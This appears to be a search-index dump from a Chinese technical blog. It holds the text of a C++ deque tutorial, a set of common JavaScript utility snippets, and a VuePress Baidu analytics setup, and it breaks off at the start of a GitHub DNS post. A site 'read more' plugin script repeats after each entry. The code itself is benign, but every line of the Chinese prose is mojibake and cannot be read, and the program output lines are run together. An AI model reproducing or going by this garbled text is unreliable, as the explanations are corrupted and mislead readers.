å†…éƒ¨çš„ä¸­æ§å™¨ç»´æŠ¤çš„æ˜¯æ¯ä¸ªç¼“å†²åŒºçš„åœ°å€ï¼Œè€Œç¼“å†²åŒºåˆ™å­˜æ”¾ç€çœŸå®çš„æ•°æ®ï¼Œç›®çš„æ˜¯è®© deque ä½¿ç”¨èµ·æ¥åƒæ˜¯ä¸€ç‰‡è¿ç»­çš„å†…å­˜ç©ºé—´ã€‚deque é‡‡å–ä¸€å—æ‰€è°“çš„ mapï¼ˆæ³¨æ„ï¼Œä¸æ˜¯ STL çš„ map å®¹å™¨ï¼‰ä½œä¸ºä¸»æ§ï¼Œè¿™é‡Œæ‰€è°“çš„ map æ˜¯ä¸€å°å—è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œå…¶ä¸­æ¯ä¸€ä¸ªå…ƒç´ ï¼ˆèŠ‚ç‚¹ï¼‰éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å¦ä¸€æ®µè¿ç»­æ€§å†…å­˜ç©ºé—´ï¼Œç§°ä½œç¼“å†²åŒºï¼Œç¼“å†²åŒºæ‰æ˜¯ deque çš„å­˜å‚¨ç©ºé—´çš„ä¸»ä½“ã€‚ deque ä¸ vector çš„åŒºåˆ« vector å¯¹äºå¤´éƒ¨çš„æ’å…¥æ•ˆç‡æä½ï¼Œæ•°æ®é‡è¶Šå¤§ï¼Œæ•ˆç‡è¶Šä½ deque ç›¸å¯¹è€Œè¨€ï¼Œå¯¹å¤´éƒ¨çš„å…ƒç´ æ’å…¥ã€åˆ é™¤é€Ÿåº¦ä¼šæ¯” vector å¿« vector è®¿é—®å…ƒç´ æ—¶çš„é€Ÿåº¦ä¼šæ¯” deque å¿«ï¼Œè¿™å’Œä¸¤è€…çš„å†…éƒ¨å®ç°æœ‰å…³ deque å®¹å™¨çš„ä½¿ç”¨deque çš„æ„é€ å’Œèµ‹å€¼123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;deque&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // éå†å®¹å™¨ for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { cout &lt;&lt; "------ deque æ„é€ å‡½æ•° ------" &lt;&lt; endl; // é»˜è®¤æ„é€ å‡½æ•° deque&lt;int&gt; d1; // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† n ä¸ª elem å…ƒç´ æ‹·è´ç»™æœ¬èº« deque&lt;int&gt; d2(5, 10); printDeque(d2); // æœ‰å‚æ„é€ å‡½æ•°ï¼Œå°† d[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº« deque&lt;int&gt; d3(d2.begin(), d2.end()); printDeque(d3); // æ‹·è´æ„é€ å‡½ deque&lt;int&gt; d4 = d3; printDeque(d4); cout &lt;&lt; "------ deque èµ‹å€¼æ“ä½œ ------" &lt;&lt; endl; // èµ‹å€¼æ“ä½œï¼Œé‡è½½ç­‰å·æ“ä½œç¬¦ deque&lt;int&gt; d5; d5 = d4; printDeque(d5); // èµ‹å€¼æ“ä½œï¼Œå°† d[begin(), end()] åŒºé—´ä¸­çš„å…ƒç´ æ‹·è´ç»™æœ¬èº« deque&lt;int&gt; d6; d6.assign(d5.begin(), d5.end()); printDeque(d6); // èµ‹å€¼æ“ä½œï¼Œå°† n ä¸ª elem å…ƒç´ æ‹·è´ç»™æœ¬èº« deque&lt;int&gt; d7; d7.assign(5, 8); printDeque(d7); // èµ‹å€¼æ“ä½œï¼Œå°†å…¶ä»–å®¹å™¨ä¸æœ¬èº«çš„å…ƒç´ äº’æ¢ d7.swap(d6); printDeque(d7); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789------ deque æ„é€ å‡½æ•° ------10 10 10 10 10 10 10 10 10 10 10 10 10 10 10 ------ deque èµ‹å€¼æ“ä½œ ------10 10 10 10 10 10 10 10 10 10 8 8 8 8 8 10 10 10 10 10 deque çš„å¸¸ç”¨æ“ä½œ123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114#include &lt;iostream&gt;#include &lt;deque&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // éå†å®¹å™¨ for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}int main() { cout &lt;&lt; "------ deque å¤§å°æ“ä½œ ------" &lt;&lt; endl; deque&lt;int&gt; d1; d1.assign(5, 10); printDeque(d1); // åˆ¤æ–­å®¹å™¨æ˜¯å¦ä¸ºç©º bool empty = d1.empty(); cout &lt;&lt; (empty ? "yes" : "no") &lt;&lt; endl; // è·å–å®¹å™¨ä¸­å…ƒç´ çš„ä¸ªæ•° size_t size = d1.size(); cout &lt;&lt; size &lt;&lt; endl; // é‡æ–°æŒ‡å®šå®¹å™¨çš„å¤§å°ä¸º numï¼Œè‹¥å®¹å™¨å˜å¤§ï¼Œåˆ™ä»¥é»˜è®¤å€¼ï¼ˆ0ï¼‰å¡«å……æ–°ä½ç½®ã€‚å¦‚æœå®¹å™¨å˜å°ï¼Œåˆ™æœ«å°¾è¶…å‡ºå®¹å™¨å¤§å°çš„å…ƒç´ ä¼šè¢«åˆ é™¤ d1.resize(7); printDeque(d1); // é‡æ–°æŒ‡å®šå®¹å™¨çš„å¤§å°ä¸º numï¼Œè‹¥å®¹å™¨å˜å¤§ï¼Œåˆ™ä»¥æŒ‡å®šå€¼å¡«å……æ–°ä½ç½®ã€‚å¦‚æœå®¹å™¨å˜å°ï¼Œåˆ™æœ«å°¾è¶…å‡ºå®¹å™¨å¤§å°çš„å…ƒç´ ä¼šè¢«åˆ é™¤ d1.resize(10, 8); printDeque(d1); cout &lt;&lt; "------ deque è¯»å–æ“ä½œ ------" &lt;&lt; endl; deque&lt;int&gt; d2; d2.push_back(1); d2.push_back(2); d2.push_back(3); d2.push_back(4); d2.push_back(5); // è¿”å›ç´¢å¼•æ‰€æŒ‡å‘çš„æ•°æ®ï¼Œå¦‚æœç´¢å¼•è¶Šç•Œï¼ŒæŠ›å‡º out_of_range å¼‚å¸¸ int num1 = d2.at(2); cout &lt;&lt; "num1 = " &lt;&lt; num1 &lt;&lt; endl; // è¿”å›ç´¢å¼•æ‰€æŒ‡å‘çš„æ•°æ®ï¼Œå¦‚æœç´¢å¼•è¶Šç•Œï¼Œç¨‹åºç»ˆæ­¢è¿è¡Œ int num2 = d2[3]; cout &lt;&lt; "num2 = " &lt;&lt; num2 &lt;&lt; endl; // è¿”å›å®¹å™¨ä¸­ç¬¬ä¸€ä¸ªæ•°æ®å…ƒç´  int font = d2.front(); cout &lt;&lt; "font = " &lt;&lt; font &lt;&lt; endl; // è¿”å›å®¹å™¨ä¸­æœ€åä¸€ä¸ªæ•°æ®å…ƒç´  int back = d2.back(); cout &lt;&lt; "back = " &lt;&lt; back &lt;&lt; endl; cout &lt;&lt; "------ deque æ’å…¥æ“ä½œ ------" &lt;&lt; endl; deque&lt;int&gt; d3(3, 8); printDeque(d3); // å¾€è¿­ä»£å™¨æŒ‡å‘çš„ä½ç½®æ’å…¥æŒ‡å®šçš„å…ƒç´  d3.insert(d3.begin(), 10); printDeque(d3); // å¾€è¿­ä»£å™¨æŒ‡å‘çš„ä½ç½®æ’å…¥ n ä¸ªæŒ‡å®šçš„å…ƒç´  d3.insert(d3.begin(), 2, 11); printDeque(d3); // å¾€è¿­ä»£å™¨æŒ‡å‘çš„ä½ç½®æ’å…¥ [begin, end) åŒºé—´çš„æ•°æ® deque&lt;int&gt; d4(2, 12); d3.insert(d3.begin(), d4.begin(), d4.end()); printDeque(d3); // åœ¨å®¹å™¨å¤´éƒ¨æ’å…¥ä¸€ä¸ªæ•°æ® d4.push_front(13); printDeque(d4); // åœ¨å®¹å™¨å°¾éƒ¨æ·»åŠ ä¸€ä¸ªæ•°æ® d4.push_back(11); printDeque(d4); cout &lt;&lt; "------ deque åˆ é™¤æ“ä½œ ------" &lt;&lt; endl; deque&lt;int&gt; d5; d5.push_back(1); d5.push_back(2); d5.push_back(3); d5.push_back(4); d5.push_back(5); d5.push_back(6); // åˆ é™¤æŒ‡å®šä½ç½®çš„æ•°æ®ï¼Œä¼šè¿”å›ä¸‹ä¸€ä¸ªæ•°æ®çš„ä½ç½® d5.erase(d5.begin()); printDeque(d5); // åˆ é™¤å®¹å™¨ç¬¬ä¸€ä¸ªæ•°æ® d5.pop_front(); printDeque(d5); // åˆ é™¤å®¹å™¨æœ€åä¸€ä¸ªæ•°æ® d5.pop_back(); printDeque(d5); // æ¸…ç©ºå®¹å™¨çš„æ‰€æœ‰æ•°æ® d5.clear(); return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 12345678910111213141516171819202122------ deque å¤§å°æ“ä½œ ------10 10 10 10 10 no510 10 10 10 10 0 0 10 10 10 10 10 0 0 8 8 8 ------ deque è¯»å–æ“ä½œ ------num1 = 3num2 = 4font = 1back = 5------ deque æ’å…¥æ“ä½œ ------8 8 8 10 8 8 8 11 11 10 8 8 8 12 12 11 11 10 8 8 8 13 12 12 13 12 12 11 ------ deque åˆ é™¤æ“ä½œ ------2 3 4 5 6 3 4 5 6 3 4 5 deque çš„æ’åºæ“ä½œåˆ©ç”¨ç®—æ³•å¯ä»¥å¯¹ deque å®¹å™¨è¿›è¡Œæ’åºï¼Œä½†éœ€è¦å¼•å…¥å¤´æ–‡ä»¶ algorithmã€‚å¯¹äºæ”¯æŒéšæœºè®¿é—®çš„è¿­ä»£å™¨çš„å®¹å™¨ï¼Œéƒ½å¯ä»¥åˆ©ç”¨ sort() æ’åºï¼Œvector å®¹å™¨ä¹Ÿå¯ä»¥ç”¨ sort() æ’åºã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include &lt;deque&gt;#include &lt;algorithm&gt;using namespace std;void printDeque(const deque&lt;int&gt; &amp;d) { // éå†å®¹å™¨ for (deque&lt;int&gt;::const_iterator it = d.begin(); it != d.end(); it++) { cout &lt;&lt; *it &lt;&lt; " "; } cout &lt;&lt; endl;}bool descCompare(const int a, const int b) { return a &gt; b;}void asc() { deque&lt;int&gt; d1; d1.push_back(3); d1.push_back(11); d1.push_back(8); d1.push_back(6); d1.push_back(21); cout &lt;&lt; "å‡åºæ’åºå‰ï¼š" &lt;&lt; endl; printDeque(d1); // å‡åºæ’åºï¼Œé»˜è®¤ä»å°åˆ°å¤§æ’åº sort(d1.begin(), d1.end()); cout &lt;&lt; "å‡åºæ’åºåï¼š" &lt;&lt; endl; printDeque(d1);}void desc() { deque&lt;int&gt; d1; d1.push_back(3); d1.push_back(11); d1.push_back(8); d1.push_back(6); d1.push_back(21); cout &lt;&lt; "é™åºæ’åºå‰ï¼š" &lt;&lt; endl; printDeque(d1); // é™åºæ’åºï¼Œé»˜è®¤ä»å¤§åˆ°å°æ’åº sort(d1.begin(), d1.end(), descCompare); cout &lt;&lt; "é™åºæ’åºåï¼š" &lt;&lt; endl; printDeque(d1);}int main() { asc(); // å‡åºæ’åº cout &lt;&lt; endl; desc(); // é™åºæ’åºå return 0;} ç¨‹åºè¿è¡Œè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š 123456789å‡åºæ’åºå‰ï¼š3 11 8 6 21 å‡åºæ’åºåï¼š3 6 8 11 21 é™åºæ’åºå‰ï¼š3 11 8 6 21 é™åºæ’åºåï¼š21 11 8 6 3 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c++"},{title:"JavaScript å¸¸ç”¨ä»£ç å—",url:"/posts/b69c820e.html",text:'ä¸€ã€æ—¥æœŸå¤„ç†1. æ—¶é—´æ ¼å¼åŒ–è¯¥æ–¹æ³•å¯ä»¥ç”¨äºå°†æ—¶é—´è½¬åŒ–ä¸º hour:minutes:seconds çš„æ ¼å¼ï¼š 12345const timeFromDate = date =&gt; date.toTimeString().slice(0, 8);timeFromDate(new Date(2021, 11, 2, 12, 30, 0)); // 12:30:00timeFromDate(new Date()); // è¿”å›å½“å‰æ—¶é—´ 09:00:00å¤åˆ¶ä»£ç  2. æ£€å¯Ÿæ—¥æœŸæ˜¯å¦æœ‰æ•ˆè¯¥æ–¹æ³•ç”¨äºæ£€æµ‹ç»™å‡ºçš„æ—¥æœŸæ˜¯å¦æœ‰æ•ˆï¼š 1234const isDateValid = (...val) =&gt; !Number.isNaN(new Date(...val).valueOf());isDateValid("December 17, 1995 03:24:00"); // trueå¤åˆ¶ä»£ç  3. è®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„é—´éš”è¯¥æ–¹æ³•ç”¨äºè®¡ç®—ä¸¤ä¸ªæ—¥æœŸä¹‹é—´çš„é—´éš”æ—¶é—´ï¼š 1234const dayDif = (date1, date2) =&gt; Math.ceil(Math.abs(date1.getTime() - date2.getTime()) / 86400000)dayDif(new Date("2021-11-3"), new Date("2022-2-1")) // 90å¤åˆ¶ä»£ç  è·ç¦»è¿‡å¹´è¿˜æœ‰ 90 å¤©ï½ 4. æŸ¥æ‰¾æ—¥æœŸä½äºä¸€å¹´ä¸­çš„ç¬¬å‡ å¤©è¯¥æ–¹æ³•ç”¨äºæ£€æµ‹ç»™å‡ºçš„æ—¥æœŸä½äºä»Šå¹´çš„ç¬¬å‡ å¤©ï¼š 1234const dayOfYear = (date) =&gt; Math.floor((date - new Date(date.getFullYear(), 0, 0)) / 1000 / 60 / 60 / 24);dayOfYear(new Date()); // 307å¤åˆ¶ä»£ç  2021 å¹´å·²ç»è¿‡å» 300 å¤šå¤©äº†ï½ äºŒã€å­—ç¬¦ä¸²å¤„ç†1. å­—ç¬¦ä¸²é¦–å­—æ¯å¤§å†™è¯¥æ–¹æ³•ç”¨äºå°†è‹±æ–‡å­—ç¬¦ä¸²çš„é¦–å­—æ¯å¤§å†™å¤„ç†ï¼š 1234const capitalize = str =&gt; str.charAt(0).toUpperCase() + str.slice(1)capitalize("hello world") // Hello worldå¤åˆ¶ä»£ç  2. ç¿»è½¬å­—ç¬¦ä¸²è¯¥æ–¹æ³•ç”¨äºå°†ä¸€ä¸ªå­—ç¬¦ä¸²è¿›è¡Œç¿»è½¬æ“ä½œï¼Œè¿”å›ç¿»è½¬åçš„å­—ç¬¦ä¸²ï¼š 1234const reverse = str =&gt; str.split(\'\').reverse().join(\'\');reverse(\'hello world\'); // \'dlrow olleh\'å¤åˆ¶ä»£ç  3. éšæœºå­—ç¬¦ä¸²è¯¥æ–¹æ³•ç”¨äºç”Ÿæˆä¸€ä¸ªéšæœºçš„å­—ç¬¦ä¸²ï¼š 1234const randomString = () =&gt; Math.random().toString(36).slice(2);randomString();å¤åˆ¶ä»£ç  4. æˆªæ–­å­—ç¬¦ä¸²è¯¥æ–¹æ³•å¯ä»¥ä»æŒ‡å®šé•¿åº¦å¤„æˆªæ–­å­—ç¬¦ä¸²: 1234const truncateString = (string, length) =&gt; string.length &lt; length ? string : `${string.slice(0, length - 3)}...`;truncateString(\'Hi, I should be truncated because I am too loooong!\', 36) // \'Hi, I should be truncated because...\'å¤åˆ¶ä»£ç  5. å»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTMLè¯¥æ–¹æ³•ç”¨äºå»é™¤å­—ç¬¦ä¸²ä¸­çš„ HTML å…ƒç´ ï¼š 12const stripHtml = html =&gt; (new DOMParser().parseFromString(html, \'text/html\')).body.textContent || \'\';å¤åˆ¶ä»£ç  ä¸‰ã€æ•°ç»„å¤„ç†1. ä»æ•°ç»„ä¸­ç§»é™¤é‡å¤é¡¹è¯¥æ–¹æ³•ç”¨äºç§»é™¤æ•°ç»„ä¸­çš„é‡å¤é¡¹ï¼š 1234const removeDuplicates = (arr) =&gt; [...new Set(arr)];console.log(removeDuplicates([1, 2, 2, 3, 3, 4, 4, 5, 5, 6]));å¤åˆ¶ä»£ç  2. åˆ¤æ–­æ•°ç»„æ˜¯å¦ä¸ºç©ºè¯¥æ–¹æ³•ç”¨äºåˆ¤æ–­ä¸€ä¸ªæ•°ç»„æ˜¯å¦ä¸ºç©ºæ•°ç»„ï¼Œå®ƒå°†è¿”å›ä¸€ä¸ªå¸ƒå°”å€¼ï¼š 1234const isNotEmpty = arr =&gt; Array.isArray(arr) &amp;&amp; arr.length &gt; 0;isNotEmpty([1, 2, 3]); // trueå¤åˆ¶ä»£ç  3. åˆå¹¶ä¸¤ä¸ªæ•°ç»„å¯ä»¥ä½¿ç”¨ä¸‹é¢ä¸¤ä¸ªæ–¹æ³•æ¥åˆå¹¶ä¸¤ä¸ªæ•°ç»„ï¼š 1234const merge = (a, b) =&gt; a.concat(b);const merge = (a, b) =&gt; [...a, ...b];å¤åˆ¶ä»£ç  å››ã€æ•°å­—æ“ä½œ1. åˆ¤æ–­ä¸€ä¸ªæ•°æ˜¯å¥‡æ•°è¿˜æ˜¯å¶æ•°è¯¥æ–¹æ³•ç”¨äºåˆ¤æ–­ä¸€ä¸ªæ•°å­—æ˜¯å¥‡æ•°è¿˜æ˜¯å¶æ•°ï¼š 1234const isEven = num =&gt; num % 2 === 0;isEven(996);å¤åˆ¶ä»£ç  2. è·å¾—ä¸€ç»„æ•°çš„å¹³å‡å€¼1234const average = (...args) =&gt; args.reduce((a, b) =&gt; a + b) / args.length;average(1, 2, 3, 4, 5); // 3å¤åˆ¶ä»£ç  3. è·å–ä¸¤ä¸ªæ•´æ•°ä¹‹é—´çš„éšæœºæ•´æ•°è¯¥æ–¹æ³•ç”¨äºè·å–ä¸¤ä¸ªæ•´æ•°ä¹‹é—´çš„éšæœºæ•´æ•° 1234const random = (min, max) =&gt; Math.floor(Math.random() * (max - min + 1) + min);random(1, 50);å¤åˆ¶ä»£ç  4. æŒ‡å®šä½æ•°å››èˆäº”å…¥è¯¥æ–¹æ³•ç”¨äºå°†ä¸€ä¸ªæ•°å­—æŒ‰ç…§æŒ‡å®šä½è¿›è¡Œå››èˆäº”å…¥ï¼š 12345const round = (n, d) =&gt; Number(Math.round(n + "e" + d) + "e-" + d)round(1.005, 2) //1.01round(1.555, 2) //1.56å¤åˆ¶ä»£ç  äº”ã€é¢œè‰²æ“ä½œ1. å°† RGB è½¬åŒ–ä¸ºåå…­æœºåˆ¶è¯¥æ–¹æ³•å¯ä»¥å°†ä¸€ä¸ª RGB çš„é¢œè‰²å€¼è½¬åŒ–ä¸º 16 è¿›åˆ¶å€¼ï¼š 1234const rgbToHex = (r, g, b) =&gt; "#" + ((1 &lt;&lt; 24) + (r &lt;&lt; 16) + (g &lt;&lt; 8) + b).toString(16).slice(1);rgbToHex(255, 255, 255); // \'#ffffff\'å¤åˆ¶ä»£ç  2. è·å–éšæœºåå…­è¿›åˆ¶é¢œè‰²è¯¥æ–¹æ³•ç”¨äºè·å–ä¸€ä¸ªéšæœºçš„åå…­è¿›åˆ¶é¢œè‰²å€¼ï¼š 1234const randomHex = () =&gt; `#${Math.floor(Math.random() * 0xffffff).toString(16).padEnd(6, "0")}`;randomHex();å¤åˆ¶ä»£ç  å…­ã€æµè§ˆå™¨æ“ä½œ1. å¤åˆ¶å†…å®¹åˆ°å‰ªåˆ‡æ¿è¯¥æ–¹æ³•ä½¿ç”¨ navigator.clipboard.writeText æ¥å®ç°å°†æ–‡æœ¬å¤åˆ¶åˆ°å‰ªè´´æ¿ï¼š 1234const copyToClipboard = (text) =&gt; navigator.clipboard.writeText(text);copyToClipboard("Hello World");å¤åˆ¶ä»£ç  2. æ¸…é™¤æ‰€æœ‰ cookieè¯¥æ–¹æ³•å¯ä»¥é€šè¿‡ä½¿ç”¨ document.cookie æ¥è®¿é—® cookie å¹¶æ¸…é™¤å­˜å‚¨åœ¨ç½‘é¡µä¸­çš„æ‰€æœ‰ cookieï¼š 12const clearCookies = document.cookie.split(\';\').forEach(cookie =&gt; document.cookie = cookie.replace(/^ +/, \'\').replace(/=.*/, `=;expires=${new Date(0).toUTCString()};path=/`));å¤åˆ¶ä»£ç  3. è·å–é€‰ä¸­çš„æ–‡æœ¬è¯¥æ–¹æ³•é€šè¿‡å†…ç½®çš„ getSelection å±æ€§è·å–ç”¨æˆ·é€‰æ‹©çš„æ–‡æœ¬ï¼š 1234const getSelectedText = () =&gt; window.getSelection().toString();getSelectedText();å¤åˆ¶ä»£ç  4. æ£€æµ‹æ˜¯å¦æ˜¯é»‘æš—æ¨¡å¼è¯¥æ–¹æ³•ç”¨äºæ£€æµ‹å½“å‰çš„ç¯å¢ƒæ˜¯å¦æ˜¯é»‘æš—æ¨¡å¼ï¼Œå®ƒæ˜¯ä¸€ä¸ªå¸ƒå°”å€¼ï¼š 1234const isDarkMode = window.matchMedia &amp;&amp; window.matchMedia(\'(prefers-color-scheme: dark)\').matchesconsole.log(isDarkMode)å¤åˆ¶ä»£ç  5. æ»šåŠ¨åˆ°é¡µé¢é¡¶éƒ¨è¯¥æ–¹æ³•ç”¨äºåœ¨é¡µé¢ä¸­è¿”å›é¡¶éƒ¨ï¼š 1234const goToTop = () =&gt; window.scrollTo(0, 0);goToTop();å¤åˆ¶ä»£ç  6. åˆ¤æ–­å½“å‰æ ‡ç­¾é¡µæ˜¯å¦æ¿€æ´»è¯¥æ–¹æ³•ç”¨äºæ£€æµ‹å½“å‰æ ‡ç­¾é¡µæ˜¯å¦å·²ç»æ¿€æ´»ï¼š 12const isTabInView = () =&gt; !document.hidden;å¤åˆ¶ä»£ç  7. åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯è‹¹æœè®¾å¤‡è¯¥æ–¹æ³•ç”¨äºæ£€æµ‹å½“å‰çš„è®¾å¤‡æ˜¯å¦æ˜¯è‹¹æœçš„è®¾å¤‡ï¼š 1234const isAppleDevice = () =&gt; /Mac|iPod|iPhone|iPad/.test(navigator.platform);isAppleDevice();å¤åˆ¶ä»£ç  8. æ˜¯å¦æ»šåŠ¨åˆ°é¡µé¢åº•éƒ¨è¯¥æ–¹æ³•ç”¨äºåˆ¤æ–­é¡µé¢æ˜¯å¦å·²ç»åº•éƒ¨ï¼š 12const scrolledToBottom = () =&gt; document.documentElement.clientHeight + window.scrollY &gt;= document.documentElement.scrollHeight;å¤åˆ¶ä»£ç  9. é‡å®šå‘åˆ°ä¸€ä¸ª URLè¯¥æ–¹æ³•ç”¨äºé‡å®šå‘åˆ°ä¸€ä¸ªæ–°çš„ URLï¼š 1234const redirect = url =&gt; location.href = urlredirect("https://www.google.com/")å¤åˆ¶ä»£ç  10. æ‰“å¼€æµè§ˆå™¨æ‰“å°æ¡†è¯¥æ–¹æ³•ç”¨äºæ‰“å¼€æµè§ˆå™¨çš„æ‰“å°æ¡†ï¼š 12const showPrintDialog = () =&gt; window.print()å¤åˆ¶ä»£ç  ä¸ƒã€å…¶ä»–æ“ä½œ1. éšæœºå¸ƒå°”å€¼è¯¥æ–¹æ³•å¯ä»¥è¿”å›ä¸€ä¸ªéšæœºçš„å¸ƒå°”å€¼ï¼Œä½¿ç”¨ Math.random () å¯ä»¥è·å¾— 0-1 çš„éšæœºæ•°ï¼Œä¸ 0.5 è¿›è¡Œæ¯”è¾ƒï¼Œå°±æœ‰ä¸€åŠçš„æ¦‚ç‡è·å¾—çœŸå€¼æˆ–è€…å‡å€¼ã€‚ 1234const randomBoolean = () =&gt; Math.random() &gt;= 0.5;randomBoolean();å¤åˆ¶ä»£ç  2. å˜é‡äº¤æ¢å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å½¢å¼åœ¨ä¸é€‚ç”¨ç¬¬ä¸‰ä¸ªå˜é‡çš„æƒ…å†µä¸‹ï¼Œäº¤æ¢ä¸¤ä¸ªå˜é‡çš„å€¼ï¼š 12[foo, bar] = [bar, foo];å¤åˆ¶ä»£ç  3. è·å–å˜é‡çš„ç±»å‹è¯¥æ–¹æ³•ç”¨äºè·å–ä¸€ä¸ªå˜é‡çš„ç±»å‹ï¼š 1234567891011const trueTypeOf = (obj) =&gt; Object.prototype.toString.call(obj).slice(8, -1).toLowerCase();trueTypeOf(\'\'); // stringtrueTypeOf(0); // numbertrueTypeOf(); // undefinedtrueTypeOf(null); // nulltrueTypeOf({}); // objecttrueTypeOf([]); // arraytrueTypeOf(0); // numbertrueTypeOf(() =&gt; {}); // functionå¤åˆ¶ä»£ç  4. åæ°åº¦å’Œæ‘„æ°åº¦ä¹‹é—´çš„è½¬åŒ–è¯¥æ–¹æ³•ç”¨äºæ‘„æ°åº¦å’Œåæ°åº¦ä¹‹é—´çš„è½¬åŒ–ï¼š 123456789const celsiusToFahrenheit = (celsius) =&gt; celsius * 9/5 + 32;const fahrenheitToCelsius = (fahrenheit) =&gt; (fahrenheit - 32) * 5/9;celsiusToFahrenheit(15); // 59celsiusToFahrenheit(0); // 32celsiusToFahrenheit(-20); // -4fahrenheitToCelsius(59); // 15fahrenheitToCelsius(32); // 0å¤åˆ¶ä»£ç  5. æ£€æµ‹å¯¹è±¡æ˜¯å¦ä¸ºç©ºè¯¥æ–¹æ³•ç”¨äºæ£€æµ‹ä¸€ä¸ª JavaScript å¯¹è±¡æ˜¯å¦ä¸ºç©ºï¼š 12const isEmpty = obj =&gt; Reflect.ownKeys(obj).length === 0 &amp;&amp; obj.constructor === Object;å¤åˆ¶ä»£ç  var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å‰ç«¯"},{title:"VuePress æ•´åˆç™¾åº¦ç»Ÿè®¡",url:"/posts/b23e0b9c.html",text:'å‰è¨€æœ¬æ–‡ä¸»è¦ä»‹ç» VuePress å¦‚ä½•æ•´åˆç™¾åº¦ç»Ÿè®¡ï¼Œé€‚ç”¨äº VuePress 1.x å’Œ VuePress 2.x ç‰ˆæœ¬ã€‚ VuePress v1.xå®‰è£…æ’ä»¶1$ npm install -D vuepress-plugin-baidu-seo é…ç½®æ’ä»¶12345678module.exports = { plugins: [ [\'vuepress-plugin-baidu-seo\', { hm: \'xxxxxxxx\', ignoreLocal: true }] ]} é…ç½®å‚æ•° å‚æ•° ç±»å‹ å¿…å¡« é»˜è®¤å€¼ æè¿° hm String æ˜¯ å·²ç”³è¯·çš„ç™¾åº¦ç»Ÿè®¡ Key ignoreLocal Boolean å¦ false å¿½ç•¥æœ¬åœ°çš„è®¿é—®è®°å½• VuePress v2.xå®‰è£…æ’ä»¶æç¤º ä¸‹è¿°æ’ä»¶è¦æ±‚ VuePress çš„ç‰ˆæœ¬å·å¤§äºç­‰äº 2.0.0-beta.48ï¼Œè‹¥ä¸æ»¡è¶³è¦æ±‚ï¼Œè¯·åŠ¡å¿…æ‰‹åŠ¨å‡çº§ VuePress çš„ç‰ˆæœ¬ï¼Œå¦åˆ™æ’ä»¶å¯èƒ½æ— æ³•ç”Ÿæ•ˆã€‚ 1$ npm install -D vuepress-plugin-baidu-seo-next é…ç½®æ’ä»¶12345678910const { baiduSeoPlugin } = require(\'vuepress-plugin-baidu-seo-next\')module.exports = { plugins: [ baiduSeoPlugin({ hm: \'xxxxxxxx\', ignoreLocal: true }) ]} é…ç½®å‚æ•° å‚æ•° ç±»å‹ å¿…å¡« é»˜è®¤å€¼ æè¿° hm String æ˜¯ å·²ç”³è¯·çš„ç™¾åº¦ç»Ÿè®¡ Key ignoreLocal Boolean å¦ false å¿½ç•¥æœ¬åœ°çš„è®¿é—®è®°å½• var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"è§£å†³ GitHub DNS è¢«æ±¡æŸ“çš„é—®é¢˜",url:"/posts/b7c0261d.html",text:'ç¬¬ä¸€æ­¥è®¿é—® IP 